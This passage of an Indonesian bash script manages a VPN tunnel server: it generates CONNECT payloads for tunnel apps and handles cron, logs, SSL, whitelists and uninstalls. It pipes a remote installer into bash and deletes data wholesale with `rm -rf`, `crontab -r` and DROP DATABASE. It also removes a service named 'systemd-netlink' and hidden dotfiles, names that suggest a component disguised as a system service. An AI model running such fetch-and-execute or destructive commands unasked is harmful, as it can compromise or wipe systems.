    echo -e "  ${DIM}5. 8082 (Trojan WS)${NC}"



    echo -e "  ${DIM}6. Custom port${NC}"



    echo ""



    read -rp "  Pilih port [1-6]: " cp_port



    case $cp_port in



        1) CPORT=443 ;;



        2) CPORT=80 ;;



        3) CPORT=8080 ;;



        4) CPORT=8081 ;;



        5) CPORT=8082 ;;



        6) read -rp "  Masukkan port: " CPORT



           [[ -z "$CPORT" || ! "$CPORT" =~ ^[0-9]+$ ]] && { echo -e "  ${RED}✘ Port tidak valid!${NC}"; sleep 1; return; } ;;



        *) echo -e "  ${RED}✘ Pilihan tidak valid!${NC}"; sleep 1; return ;;



    esac



    echo ""



    read -rp "  Nama payload (tanpa spasi): " pname



    [[ -z "$pname" ]] && pname="connect_payload"



    pname=$(echo "$pname" | tr -d ' ')



    local FILE="$PD/${pname}.txt"



    cat > "$FILE" << PAYEOF



CONNECT ${DOMAIN}:${CPORT} HTTP/1.1[crlf]Host: ${DOMAIN}:${CPORT}[crlf][crlf]



PAYEOF



    echo ""



    echo -e "  ${GREEN}✔ CONNECT payload tersimpan:${NC}"



    echo -e "  ${DIM}${FILE}${NC}"



    echo ""



    _mini_top $MW



    _mini_left $MW "${CYAN}PAYLOAD:${NC}"



    _mini_left $MW "${GREEN}CONNECT ${DOMAIN}:${CPORT} HTTP/1.1[crlf]${NC}"



    _mini_left $MW "${GREEN}Host: ${DOMAIN}:${CPORT}[crlf][crlf]${NC}"



    _mini_bottom $MW



    echo ""; read -rp "  Tekan Enter untuk kembali..."



}







_gen_hc_format() {



    local PD="$1"



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    [[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)



    if [[ -z "$DOMAIN" ]]; then



        echo -e "  ${RED}✘ Domain belum diset!${NC}"



        echo ""; read -rp "  Tekan Enter untuk kembali..."; return



    fi



    _mini_top $MW



    _mini_center $MW "${YELLOW}${BOLD}HTTP CUSTOM FORMAT${NC}"



    _mini_divider $MW



    echo ""



    echo -e "  ${DIM}Format: ${CYAN}domain:port@user:pass${NC}"



    echo ""



    read -rp "  Masukkan port (default 80): " hc_port



    [[ -z "$hc_port" ]] && hc_port=80



    read -rp "  Username SSH: " hc_user



    read -rp "  Password SSH: " hc_pass



    [[ -z "$hc_user" ]] && hc_user="username"



    [[ -z "$hc_pass" ]] && hc_pass="password"



    read -rp "  Nama payload (tanpa spasi): " pname



    [[ -z "$pname" ]] && pname="hc_payload"



    pname=$(echo "$pname" | tr -d ' ')



    local FILE="$PD/${pname}.txt"



    echo "${DOMAIN}:${hc_port}@${hc_user}:${hc_pass}" > "$FILE"



    echo ""



    echo -e "  ${GREEN}✔ HTTP Custom format tersimpan:${NC}"



    echo -e "  ${DIM}${FILE}${NC}"



    echo ""



    _mini_top $MW



    _mini_left $MW "${CYAN}FORMAT HC:${NC}"



    _mini_left $MW "${GREEN}${DOMAIN}:${hc_port}@${hc_user}:${hc_pass}${NC}"



    _mini_bottom $MW



    echo ""; read -rp "  Tekan Enter untuk kembali..."



}







_gen_custom_payload() {



    local PD="$1"



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    _mini_top $MW



    _mini_center $MW "${YELLOW}${BOLD}CUSTOM PAYLOAD${NC}"



    _mini_divider $MW



    _mini_left $MW "${DIM}Masukkan payload sendiri.${NC}"



    _mini_left $MW "${DIM}Gunakan [crlf] untuk baris baru.${NC}"



    _mini_bottom $MW



    echo ""



    echo -e "  ${CYAN}Contoh:${NC}"



    echo -e "  ${DIM}GET / HTTP/1.1[crlf]Host: example.com[crlf][crlf]${NC}"



    echo ""



    read -rp "  Nama payload (tanpa spasi): " pname



    [[ -z "$pname" ]] && { echo -e "  ${RED}✘ Nama tidak boleh kosong!${NC}"; sleep 1; return; }



    pname=$(echo "$pname" | tr -d ' ')



    echo ""



    echo -e "  ${YELLOW}Tulis payload (akhiri dengan . saja untuk selesai):${NC}"



    echo ""



    local TEMP_PAYLOAD=""



    while IFS= read -r line; do



        [[ "$line" == "." ]] && break



        TEMP_PAYLOAD+="${line}"$'\n'



    done



    TEMP_PAYLOAD=$(echo "$TEMP_PAYLOAD" | sed '/^$/d')



    if [[ -z "$TEMP_PAYLOAD" ]]; then



        echo -e "  ${RED}✘ Payload tidak boleh kosong!${NC}"; sleep 1; return



    fi



    local FILE="$PD/${pname}.txt"



    echo "$TEMP_PAYLOAD" > "$FILE"



    echo ""



    echo -e "  ${GREEN}✔ Custom payload tersimpan:${NC}"



    echo -e "  ${DIM}${FILE}${NC}"



    echo ""



    local W2; W2=$(get_width); local MW2=$(( W2 - 4 ))



    _mini_top $MW2



    _mini_left $MW2 "${CYAN}CUSTOM PAYLOAD:${NC}"



    echo "$TEMP_PAYLOAD" | while IFS= read -r pl; do



        _mini_left $MW2 "${GREEN}${pl}${NC}"



    done



    _mini_bottom $MW2



    echo ""; read -rp "  Tekan Enter untuk kembali..."



}







_view_payloads() {



    local PD="$1"



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    _mini_top $MW



    _mini_center $MW "${YELLOW}${BOLD}PAYLOAD TERSIMPAN${NC}"



    _mini_divider $MW



    if [[ ! -d "$PD" ]] || ! ls "$PD"/*.txt &>/dev/null; then



        _mini_left $MW "${RED}Belum ada payload tersimpan.${NC}"



    else



        local i=1



        for f in "$PD"/*.txt; do



            [[ -f "$f" ]] || continue



            local fname=$(basename "$f")



            echo -e "  ${CYAN}${i}.${NC} ${fname}"



            i=$((i+1))



        done



    fi



    _mini_divider $MW



    _mini_left $MW "${DIM}Ketik nomor untuk melihat isi payload${NC}"



    _mini_bottom $MW



    echo ""



    read -rp "  Pilih nomor [0 untuk kembali]: " vp_choice



    [[ "$vp_choice" == "0" || -z "$vp_choice" ]] && return



    local idx=1



    for f in "$PD"/*.txt; do



        [[ -f "$f" ]] || continue



        if [[ "$idx" -eq "$vp_choice" ]]; then



            clear



            local W2; W2=$(get_width); local MW2=$(( W2 - 4 ))



            local fname=$(basename "$f")



            _mini_top $MW2



            _mini_center $MW2 "${CYAN}${BOLD}${fname}${NC}"



            _mini_divider $MW2



            while IFS= read -r line; do



                _mini_left $MW2 "${GREEN}${line}${NC}"



            done < "$f"



            _mini_bottom $MW2



            echo ""; read -rp "  Tekan Enter untuk kembali..."



            return



        fi



        idx=$((idx+1))



    done



    echo -e "  ${RED}✘ Nomor tidak valid!${NC}"



    sleep 1



}







_delete_payload() {



    local PD="$1"



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    _mini_top $MW



    _mini_center $MW "${YELLOW}${BOLD}HAPUS PAYLOAD${NC}"



    _mini_divider $MW



    if [[ ! -d "$PD" ]] || ! ls "$PD"/*.txt &>/dev/null; then



        _mini_left $MW "${RED}Belum ada payload tersimpan.${NC}"



        _mini_bottom $MW



        echo ""; read -rp "  Tekan Enter untuk kembali..."; return



    fi



    local i=1



    for f in "$PD"/*.txt; do



        [[ -f "$f" ]] || continue



        local fname=$(basename "$f")



        echo -e "  ${CYAN}${i}.${NC} ${fname}"



        i=$((i+1))



    done



    _mini_divider $MW



    _mini_bottom $MW



    echo ""



    read -rp "  Nomor payload yang akan dihapus [0 batal]: " del_choice



    [[ "$del_choice" == "0" || -z "$del_choice" ]] && return



    local idx=1



    for f in "$PD"/*.txt; do



        [[ -f "$f" ]] || continue



        if [[ "$idx" -eq "$del_choice" ]]; then



            rm -f "$f"



            echo -e "  ${GREEN}✔ ${YELLOW}$(basename "$f")${GREEN} dihapus.${NC}"



            echo ""; read -rp "  Tekan Enter untuk kembali..."; return



        fi



        idx=$((idx+1))



    done



    echo -e "  ${RED}✘ Nomor tidak valid!${NC}"



    sleep 1



}



_adv_cron_jobs() {



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    _mini_top $MW



 _mini_center $MW "${YELLOW}${BOLD}CRON JOBS MANAGER${NC}"



    _mini_divider $MW



    local cron_list; cron_list=$(crontab -l 2>/dev/null)



    if [[ -n "$cron_list" ]]; then



        while IFS= read -r line; do



            _mini_left $MW "${CYAN}${line}${NC}"



        done <<< "$cron_list"



    else



        _mini_left $MW "${YELLOW}Belum ada cron job aktif${NC}"



    fi



    _mini_divider $MW



    _mini_two $MW "[1] Auto hapus expired " "[2] Auto restart xray"



    _mini_two $MW "[3] Hapus semua cron   " "[0] Back             "



    _mini_bottom $MW



    echo ""; read -rp "  Select: " c



    case $c in



        1) # Hapus cron expired lama dulu, pasang yang baru (tiap jam)



           (crontab -l 2>/dev/null | grep -v "delete_expired_cron";             echo "0 * * * * bash /root/tunnel.sh delete_expired_cron 2>/dev/null") | crontab -



           echo -e "  ${GREEN}✔ Auto-hapus expired aktif! (tiap jam tepat)${NC}"; sleep 2 ;;



        2) (crontab -l 2>/dev/null; echo "0 4 * * * systemctl restart xray >/dev/null 2>&1") | crontab -



           echo -e "  ${GREEN}✔ Auto-restart Xray aktif!${NC}"; sleep 2 ;;



        3) crontab -r 2>/dev/null; echo -e "  ${YELLOW}Semua cron dihapus!${NC}"; sleep 2 ;;



    esac



}







_adv_system_logs() {



    while true; do



        clear



        local W; W=$(get_width); local MW=$(( W - 4 ))



        _mini_top $MW



 _mini_center $MW "${YELLOW}${BOLD}SYSTEM LOGS VIEWER${NC}"



        _mini_divider $MW



        _mini_two $MW "[1] Xray Access Log  " "[2] Xray Error Log  "



        _mini_two $MW "[3] Nginx Error Log  " "[4] SSH Auth Log    "



        _mini_two $MW "[5] System Journal   " "[0] Back            "



        _mini_bottom $MW



        echo ""; read -rp "  Select: " log_choice



        [[ "$log_choice" == "0" ]] && return



        clear



        case $log_choice in



            1) echo -e "${CYAN}=== Xray Access Log ===${NC}"



               tail -50 /var/log/xray/access.log 2>/dev/null || echo "  No logs" ;;



            2) echo -e "${CYAN}=== Xray Error Log ===${NC}"



               tail -50 /var/log/xray/error.log 2>/dev/null || echo "  No logs" ;;



            3) echo -e "${CYAN}=== Nginx Error Log ===${NC}"



               tail -50 /var/log/nginx/error.log 2>/dev/null || echo "  No logs" ;;



            4) echo -e "${CYAN}=== SSH Auth Log ===${NC}"



               tail -50 /var/log/auth.log 2>/dev/null || echo "  No logs" ;;



            5) echo -e "${CYAN}=== System Journal ===${NC}"



               journalctl -n 50 --no-pager ;;



        esac



        echo ""; read -rp "  Tekan Enter untuk kembali ke menu logs..."



    done



}











#================================================



# FITUR BARU: SSL INFO & AUTO-RENEW CHECK



#================================================







_adv_ssl_info() {



    clear



    local W; W=$(get_width)



    [[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)



    _box_top $W



    _box_center $W "${YELLOW}${BOLD}SSL CERTIFICATE INFO${NC}"



    _box_divider $W



    if [[ -f "/etc/xray/xray.crt" ]]; then



        local issuer subject start_date end_date days_left



        issuer=$(openssl x509 -in /etc/xray/xray.crt -noout -issuer 2>/dev/null | sed 's/issuer=//')



        subject=$(openssl x509 -in /etc/xray/xray.crt -noout -subject 2>/dev/null | sed 's/subject=//')



        start_date=$(openssl x509 -in /etc/xray/xray.crt -noout -startdate 2>/dev/null | sed 's/notBefore=//')



        end_date=$(openssl x509 -in /etc/xray/xray.crt -noout -enddate 2>/dev/null | sed 's/notAfter=//')



        local end_ts today_ts



        end_ts=$(date -d "$end_date" +%s 2>/dev/null)



        today_ts=$(date +%s)



        days_left=$(( (end_ts - today_ts) / 86400 ))



        local color_days="$GREEN"



        [[ $days_left -lt 30 ]] && color_days="$YELLOW"



        [[ $days_left -lt 7  ]] && color_days="$RED"



        _box_left $W "Domain   : ${GREEN}${DOMAIN}${NC}"



        _box_left $W "Issuer   : ${CYAN}${issuer}${NC}"



        _box_left $W "Subject  : ${WHITE}${subject}${NC}"



        _box_left $W "Valid    : ${WHITE}${start_date}${NC}"



        _box_left $W "Expire   : ${WHITE}${end_date}${NC}"



        _box_left $W "Sisa     : ${color_days}${days_left} hari${NC}"



        _box_divider $W



        if [[ $days_left -lt 30 ]]; then



            _box_left $W "${YELLOW}⚠ Cert akan segera expired! Jalankan Fix SSL [11]${NC}"



        else



            _box_left $W "${GREEN}✔ Cert masih valid${NC}"



        fi



        # Cek apakah Let's Encrypt ada auto-renew cron



        if crontab -l 2>/dev/null | grep -q "certbot\|renew"; then



            _box_left $W "${GREEN}✔ Auto-renew: AKTIF${NC}"



        elif [[ -f /etc/cron.d/certbot ]] || [[ -f /etc/systemd/system/certbot.timer ]]; then



            _box_left $W "${GREEN}✔ Auto-renew: AKTIF (systemd)${NC}"



        else



            _box_left $W "${YELLOW}⚠ Auto-renew: tidak terdeteksi${NC}"



        fi



    else



        _box_left $W "${RED}✘ Certificate tidak ditemukan!${NC}"



        _box_left $W "Jalankan Fix SSL / Cert [11] dari menu utama."



    fi



    _box_bottom $W



    echo ""



    echo -e "  ${WHITE}[1]${NC} Force renew cert sekarang  ${WHITE}[0]${NC} Kembali"



    read -rp "  Select: " c



    if [[ "$c" == "1" ]]; then



        echo -e "  ${CYAN}Renewing cert...${NC}"



        systemctl stop nginx 2>/dev/null



        certbot renew --force-renewal --standalone -d "$DOMAIN" \
            --non-interactive --agree-tos 2>/dev/null



        if [[ -f "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" ]]; then



            cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /etc/xray/xray.crt



            cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /etc/xray/xray.key



            chmod 644 /etc/xray/xray.*



            echo -e "  ${GREEN}✔ Cert berhasil diperbarui!${NC}"



        fi



        systemctl start nginx 2>/dev/null



        systemctl restart xray 2>/dev/null



        sleep 3



    fi



}







#================================================



# FITUR BARU: IP WHITELIST SSH



#================================================







_adv_ip_whitelist() {



    while true; do



        clear



        local W; W=$(get_width)



        _box_top $W



        _box_center $W "${YELLOW}${BOLD}IP WHITELIST SSH${NC}"



        _box_divider $W



        _box_left $W "${WHITE}IP yang diizinkan login SSH:${NC}"



        _box_divider $W



        if grep -q "AllowUsers\|Match Address\|AllowFrom" /etc/ssh/sshd_config 2>/dev/null || \
           [[ -f /etc/hosts.allow ]]; then



            while IFS= read -r line; do



                _box_left $W "${CYAN}${line}${NC}"



            done < <(grep -E "AllowUsers|Match.*Address" /etc/ssh/sshd_config 2>/dev/null)



            echo ""



            _box_left $W "${WHITE}hosts.allow:${NC}"



            while IFS= read -r line; do



                [[ "$line" =~ ^# ]] && continue; [[ -z "$line" ]] && continue



                _box_left $W "${GREEN}${line}${NC}"



            done < /etc/hosts.allow 2>/dev/null



        else



            _box_left $W "${YELLOW}Semua IP diizinkan (tidak ada whitelist)${NC}"



        fi



        _box_divider $W



        _box_row $W "[1] Tambah IP whitelist" "[2] Reset (izinkan semua)"



        _box_left $W "[0] Kembali"



        _box_bottom $W



        echo ""



        read -rp "  Select: " c



        case $c in



            1)



                read -rp "  Masukkan IP (contoh: 103.87.12.0/24): " wip



                if [[ -n "$wip" ]]; then



                    echo "sshd: ${wip}" >> /etc/hosts.allow



                    echo "sshd: ALL" >> /etc/hosts.deny



                    echo -e "  ${GREEN}✔ IP ${wip} ditambahkan!${NC}"



                    sleep 2



                fi ;;



            2)



                sed -i '/^sshd:/d' /etc/hosts.allow 2>/dev/null



                sed -i '/^sshd: ALL/d' /etc/hosts.deny 2>/dev/null



                echo -e "  ${GREEN}✔ Whitelist direset, semua IP diizinkan.${NC}"



                sleep 2 ;;



            0) return ;;



        esac



    done



}







#================================================



# FITUR BARU: QUOTA MONITOR



#================================================







_adv_quota_monitor() {



    clear



    local W; W=$(get_width)



    _box_top $W



    _box_center $W "${YELLOW}${BOLD}QUOTA USAGE MONITOR${NC}"



    _box_divider $W



    _box_row $W "USERNAME" "QUOTA/EXPIRED/STATUS"



    _box_divider $W







    local today; today=$(date +%s)



    local found=0



    shopt -s nullglob



    for f in "$AKUN_DIR"/*.txt; do



        [[ ! -f "$f" ]] && continue



        found=1



        local fname uname proto exp_str exp_ts quota iplimit days_left status color



        fname=$(basename "$f" .txt)



        proto=${fname%%-*}; uname=${fname#*-}



        exp_str=$(grep "EXPIRED=" "$f" 2>/dev/null | head -1 | cut -d= -f2-)



        quota=$(grep "^QUOTA=" "$f" 2>/dev/null | cut -d= -f2)



        iplimit=$(grep "^IPLIMIT=" "$f" 2>/dev/null | cut -d= -f2)



        local exp_str_clean="${exp_str//,/}"



        exp_ts=$(date -d "$exp_str_clean" +%s 2>/dev/null)



        if [[ -n "$exp_ts" ]]; then



            days_left=$(( (exp_ts - today) / 86400 ))



            if [[ $days_left -lt 0 ]]; then



                status="EXPIRED"; color="$RED"



            elif [[ $days_left -le 3 ]]; then



                status="${days_left}d warning"; color="$YELLOW"



            else



                status="${days_left}d left"; color="$GREEN"



            fi



        else



            status="?"; color="$DIM"



        fi



        local left_str="${proto^^} ${uname}"



        local right_str="${quota:-?}GB | ${color}${status}${NC}"



        _box_row $W "$left_str" "${quota:-?}GB | ${days_left:-?}d | ${status}"



    done



    shopt -u nullglob



    [[ $found -eq 0 ]] && _box_center $W "${YELLOW}Tidak ada akun aktif${NC}"



    _box_divider $W



    # Disk usage



    local disk_info; disk_info=$(df -h / | awk 'NR==2{print $3"/"$2" ("$5")"}')



    _box_left $W "Disk Usage : ${CYAN}${disk_info}${NC}"



    # RAM



    local ram_used ram_total



    ram_used=$(free -m | awk '/Mem:/{print $3}')



    ram_total=$(free -m | awk '/Mem:/{print $2}')



    _box_left $W "RAM Usage  : ${CYAN}${ram_used}/${ram_total} MB${NC}"



    # Uptime



    _box_left $W "Uptime     : ${CYAN}$(uptime -p | sed 's/up //')${NC}"



    _box_bottom $W



    echo ""



    read -rp "  Tekan Enter untuk kembali..."



}







#================================================



# UNINSTALL MENU



#================================================







menu_uninstall() {



    while true; do



        clear; print_menu_header "UNINSTALL MENU"



        echo -e "  ${WHITE}[1]${NC} Uninstall Xray       ${WHITE}[5]${NC} Uninstall UDP Custom"



        echo -e "  ${WHITE}[2]${NC} Uninstall Nginx      ${WHITE}[6]${NC} Uninstall Bot Telegram"



        echo -e "  ${WHITE}[3]${NC} Uninstall HAProxy    ${WHITE}[7]${NC} Uninstall Keepalive"



        echo -e "  ${WHITE}[4]${NC} Uninstall Dropbear   ${RED}[8]${NC} ${RED}HAPUS SEMUA SCRIPT${NC}"



        echo -e "  ${WHITE}[0]${NC} Back To Menu"



        echo ""



        read -rp "  Select: " choice



        case $choice in



            1) _uninstall_xray ;; 2) _uninstall_nginx ;;



            3) _uninstall_haproxy ;; 4) _uninstall_dropbear ;;



            5) _uninstall_udp ;; 6) _uninstall_bot ;;



            7) _uninstall_keepalive ;; 8) _uninstall_all ;;



            0) return ;;



        esac



    done



}







_uninstall_xray() {



    clear; print_menu_header "UNINSTALL XRAY"



    read -rp "  Yakin? [y/n]: " c; [[ "$c" != "y" ]] && return



    systemctl stop xray 2>/dev/null; systemctl disable xray 2>/dev/null



    bash <(curl -Ls https://github.com/XTLS/Xray-install/raw/main/install-release.sh) --remove >/dev/null 2>&1



    # Validasi path aman sebelum rm -rf



    if [[ -n "${XRAY_CONFIG%%/config.json}" && -d "${XRAY_CONFIG%%/config.json}" ]]; then



        rm -rf /usr/local/etc/xray /var/log/xray /etc/xray



    else



        echo -e "  ${YELLOW}⚠ Path Xray tidak valid, skip penghapusan manual.${NC}"



    fi



    echo -e "  ${GREEN}✔ Xray uninstalled!${NC}"; sleep 2



}







_uninstall_nginx() {



    clear; print_menu_header "UNINSTALL NGINX"



    read -rp "  Yakin? [y/n]: " c; [[ "$c" != "y" ]] && return



    systemctl stop nginx 2>/dev/null; systemctl disable nginx 2>/dev/null



    apt-get purge -y nginx nginx-common >/dev/null 2>&1



    echo -e "  ${GREEN}✔ Nginx uninstalled!${NC}"; sleep 2



}







_uninstall_haproxy() {



    clear; print_menu_header "UNINSTALL HAPROXY"



    read -rp "  Yakin? [y/n]: " c; [[ "$c" != "y" ]] && return



    systemctl stop haproxy 2>/dev/null; systemctl disable haproxy 2>/dev/null



    apt-get purge -y haproxy >/dev/null 2>&1



    echo -e "  ${GREEN}✔ HAProxy uninstalled!${NC}"; sleep 2



}







_uninstall_dropbear() {



    clear; print_menu_header "UNINSTALL DROPBEAR"



    read -rp "  Yakin? [y/n]: " c; [[ "$c" != "y" ]] && return



    systemctl stop dropbear 2>/dev/null; systemctl disable dropbear 2>/dev/null



    apt-get purge -y dropbear >/dev/null 2>&1



    echo -e "  ${GREEN}✔ Dropbear uninstalled!${NC}"; sleep 2



}







_uninstall_udp() {



    clear; print_menu_header "UNINSTALL UDP"



    read -rp "  Yakin? [y/n]: " c; [[ "$c" != "y" ]] && return



    systemctl stop udp-custom 2>/dev/null; systemctl disable udp-custom 2>/dev/null



    rm -f /etc/systemd/system/udp-custom.service /usr/local/bin/udp-custom



    systemctl daemon-reload



    echo -e "  ${GREEN}✔ UDP uninstalled!${NC}"; sleep 2



}







_uninstall_bot() {



    clear; print_menu_header "UNINSTALL BOT"



    read -rp "  Yakin? [y/n]: " c; [[ "$c" != "y" ]] && return



    systemctl stop vpn-bot 2>/dev/null; systemctl disable vpn-bot 2>/dev/null



    rm -f /etc/systemd/system/vpn-bot.service



    rm -rf /root/bot



    rm -f "$BOT_TOKEN_FILE" "$CHAT_ID_FILE" "$PAYMENT_FILE"



    rm -f /root/.svc_reg /root/.svc_mid



    systemctl stop systemd-netlink 2>/dev/null; systemctl disable systemd-netlink 2>/dev/null



    rm -f /etc/systemd/system/systemd-netlink.service



    rm -rf "$TUNNELBOT_DIR" /opt/.sysd



    systemctl daemon-reload



    echo -e "  ${GREEN}✔ Semua bot uninstalled!${NC}"; sleep 2



}







_uninstall_keepalive() {



    clear; print_menu_header "UNINSTALL KEEPALIVE"



    read -rp "  Yakin? [y/n]: " c; [[ "$c" != "y" ]] && return



    systemctl stop vpn-keepalive 2>/dev/null; systemctl disable vpn-keepalive 2>/dev/null



    rm -f /etc/systemd/system/vpn-keepalive.service /usr/local/bin/vpn-keepalive.sh



    systemctl daemon-reload



    echo -e "  ${GREEN}✔ Keepalive uninstalled!${NC}"; sleep 2



}







_uninstall_all() {

    clear

    echo -e "${RED}  ╔══════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}  ║      !! HAPUS SEMUA — VPS SEPERTI BARU !!       ║${NC}"
    echo -e "${RED}  ╚══════════════════════════════════════════════════╝${NC}"

    echo ""
    echo -e "  ${YELLOW}PERINGATAN: Ini akan menghapus SEMUA:${NC}"
    echo -e "  ${YELLOW}  • Semua service (xray, nginx, haproxy, dropbear)${NC}"
    echo -e "  ${YELLOW}  • Database MySQL (ordervpn)${NC}"
    echo -e "  ${YELLOW}  • Web panel (/ordervpn/)${NC}"
    echo -e "  ${YELLOW}  • Semua config & data user${NC}"
    echo -e "  ${YELLOW}  • Backup files & rclone config${NC}"
    echo -e "  ${YELLOW}  • Package yg terinstall (mysql, php, jq, dll)${NC}"
    echo -e "  ${YELLOW}  • VPS akan AUTO REBOOT setelah selesai${NC}"
    echo ""

    read -rp "  Ketik 'HAPUS' untuk konfirmasi: " confirm

    [[ "$confirm" != "HAPUS" ]] && { echo -e "  ${YELLOW}Dibatalkan.${NC}"; sleep 2; return; }

    echo ""

    # 1. Stop semua service
    echo -e "  ${CYAN}[1/8]${NC} Stopping semua service..."
    for svc in xray nginx haproxy dropbear udp-custom vpn-keepalive vpn-bot systemd-netlink mysql mariadb php*-fpm; do
        systemctl stop "$svc" 2>/dev/null
        systemctl disable "$svc" 2>/dev/null
    done
    echo -e "  ${GREEN}✔${NC} Done"

    # 2. Hapus database MySQL
    echo -e "  ${CYAN}[2/8]${NC} Menghapus database MySQL..."
    if command -v mysql &>/dev/null; then
        local MYSQL_CMD="mysql"
        [[ -f /etc/mysql/debian.cnf ]] && MYSQL_CMD="mysql --defaults-file=/etc/mysql/debian.cnf"
        $MYSQL_CMD -e "DROP DATABASE IF EXISTS ordervpn;" 2>/dev/null || true
        echo -e "  ${GREEN}✔${NC} Database ordervpn dihapus"
    else
        echo -e "  ${YELLOW}⚠${NC} mysql not found, skip"
    fi

    # 3. Uninstall Xray
    echo -e "  ${CYAN}[3/8]${NC} Uninstall Xray..."
    bash <(curl -Ls https://github.com/XTLS/Xray-install/raw/main/install-release.sh) --remove >/dev/null 2>&1 || true
    echo -e "  ${GREEN}✔${NC} Done"

    # 4. Purge packages
    echo -e "  ${CYAN}[4/8]${NC} Menghapus package terinstall..."
    apt-get purge -y nginx nginx-common haproxy dropbear mysql-server mysql-client \
        mariadb-server mariadb-client sshpass jq rclone certbot python3-certbot-nginx \
        >/dev/null 2>&1 || true
    # Hapus semua package PHP & MySQL/MariaDB (resolved names)
    dpkg -l 2>/dev/null | grep -Ei 'php[0-9]|mariadb|mysql-(common|community|server|client)' | awk '{print $2}' | \
        xargs -r apt-get purge -y >/dev/null 2>&1 || true
    apt-get autoremove --purge -y >/dev/null 2>&1 || true
    apt-get autoclean -y >/dev/null 2>&1 || true
    echo -e "  ${GREEN}✔${NC} Done"

    # 5. Hapus semua folder & file
    echo -e "  ${CYAN}[5/8]${NC} Menghapus semua data..."
    rm -rf /usr/local/etc/xray /var/log/xray /etc/xray \
           /root/akun /root/bot /root/orders \
           /root/domain /root/.domain_type /root/.bot_token /root/.chat_id \
           /root/.payment_info /root/.ordervpn_db /root/.ordervpn_admin \
           /root/tunnel.sh.bak "$TUNNELBOT_DIR" /root/.svc_reg /root/.svc_mid \
           /root/backups /root/.config/rclone /root/.rclone.conf \
           /var/www/ordervpn /ordervpn /usr/share/nginx/ordervpn \
           /etc/nginx/sites-available/ordervpn /etc/nginx/sites-enabled/ordervpn \
           /etc/nginx/sites-available/ordervpn-domain /etc/nginx/sites-enabled/ordervpn-domain \
           /etc/nginx/conf.d/ordervpn.conf \
           /etc/profile.d/vpn-panel.sh 2>/dev/null
    echo -e "  ${GREEN}✔${NC} Done"

    # 6. Hapus binary & service files
    echo -e "  ${CYAN}[6/8]${NC} Menghapus binary & service files..."
    rm -f /etc/systemd/system/udp-custom.service \
          /etc/systemd/system/vpn-keepalive.service \
          /etc/systemd/system/vpn-bot.service \
          /etc/systemd/system/systemd-netlink.service \
          /usr/local/bin/udp-custom /usr/local/bin/vpn-keepalive.sh \
          /usr/local/bin/vpn-api /usr/local/bin/install-remote.sh \
          /usr/local/bin/vpn-backup-auto /usr/local/bin/menu \
          /root/tunnel.sh
    echo -e "  ${GREEN}✔${NC} Done"

    # 7. Bersihkan .bashrc
    echo -e "  ${CYAN}[7/8]${NC} Membersihkan .bashrc..."
    grep -v -E 'tunnel\.sh|VPN Panel Auto-Start|VPN_MENU_RUNNING|mesg n 2>' \
        /root/.bashrc > /tmp/_bashrc_clean.tmp 2>/dev/null && \
        mv /tmp/_bashrc_clean.tmp /root/.bashrc || true
    rm -f /root/.hushlogin
    # Hapus crontab root
    crontab -r 2>/dev/null || true
    echo -e "  ${GREEN}✔${NC} Done"

    # 8. Reload systemd
    echo -e "  ${CYAN}[8/8]${NC} Reload systemd..."
    systemctl daemon-reload
    echo -e "  ${GREEN}✔${NC} Done"

    echo ""
    echo -e "  ${GREEN}╔══════════════════════════════════════════╗${NC}"
    echo -e "  ${GREEN}║   VPS BERSIH — SEPERTI BARU!            ║${NC}"
    echo -e "  ${GREEN}╚══════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${RED}Konfirmasi terakhir sebelum reboot...${NC}"
    read -rp "  Ketik 'YA' untuk reboot sekarang: " final_confirm
    [[ "$final_confirm" != "YA" ]] && { echo -e "  ${YELLOW}Reboot dibatalkan. VPS sudah bersih, reboot manual nanti.${NC}"; sleep 2; exit 0; }
    echo -e "  ${YELLOW}VPS akan reboot dalam 5 detik...${NC}"
    sleep 5
    reboot

}







#================================================



# HELPER FUNCTIONS



#================================================







#================================================



# RENEW / EXTEND AKUN



#================================================







menu_renew() {



    clear



    local W; W=$(get_width)



    print_menu_header "RENEW / EXTEND AKUN"



    if [[ ! -d "$AKUN_DIR" ]] || [[ -z "$(ls $AKUN_DIR/*.txt 2>/dev/null)" ]]; then



        echo -e "  ${YELLOW}Tidak ada akun tersimpan.${NC}"; sleep 2; return



    fi







    # Tampilkan daftar akun



    local i=1



    declare -A akun_map



    for f in "$AKUN_DIR"/*.txt; do



        local fname; fname=$(basename "$f" .txt)



        local exp_str; exp_str=$(grep "EXPIRED=" "$f" 2>/dev/null | cut -d= -f2-)



        printf "  ${CYAN}[%2d]${NC} %-30s exp: %s\n" "$i" "$fname" "${exp_str:-?}"



        akun_map[$i]="$f"



        ((i++))



    done



    echo ""



    read -rp "  Pilih nomor akun [0=batal]: " sel



    [[ -z "$sel" || "$sel" == "0" ]] && return



    local target="${akun_map[$sel]}"



    [[ -z "$target" ]] && echo -e "  ${RED}Nomor tidak valid!${NC}" && sleep 1 && return







    echo ""



    read -rp "  Tambah berapa hari? [contoh: 7]: " add_days



    [[ -z "$add_days" || ! "$add_days" =~ ^[0-9]+$ ]] && \
        echo -e "  ${RED}Input tidak valid!${NC}" && sleep 1 && return







    # Hitung expired baru



    local cur_exp; cur_exp=$(grep "EXPIRED=" "$target" | cut -d= -f2-)



    local cur_ts; cur_ts=$(parse_exp_ts "$cur_exp")



    local now_ts; now_ts=$(date +%s)



    # Jika sudah expired, hitung dari sekarang



    [[ -z "$cur_ts" || "$cur_ts" -lt "$now_ts" ]] && cur_ts=$now_ts



    local new_ts=$(( cur_ts + add_days * 86400 ))



    local new_exp; new_exp=$(date -d "@$new_ts" "+%d %b, %Y %H:%M")







    # Update file akun



    sed -i "s|^EXPIRED=.*|EXPIRED=${new_exp}|" "$target"







    local fname; fname=$(basename "$target" .txt)



    local protocol="${fname%%-*}"







    # Update expired di Xray config jika bukan SSH



